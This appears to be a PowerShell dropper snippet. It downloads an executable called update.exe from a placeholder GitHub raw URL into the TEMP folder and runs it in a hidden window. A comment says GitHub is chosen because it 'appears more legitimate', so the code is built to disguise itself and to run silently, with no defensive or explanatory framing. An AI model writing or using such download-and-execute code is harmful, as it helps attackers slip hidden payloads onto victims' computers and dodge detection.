# Download from GitHub (appears more legitimate)
$url = "https://github.com/username/repo/raw/main/update.exe" # Replace with real raw link
$output = "$env:TEMP\update.exe"
(New-Object Net.WebClient).DownloadFile($url, $output)
Start-Process $output -WindowStyle Hidden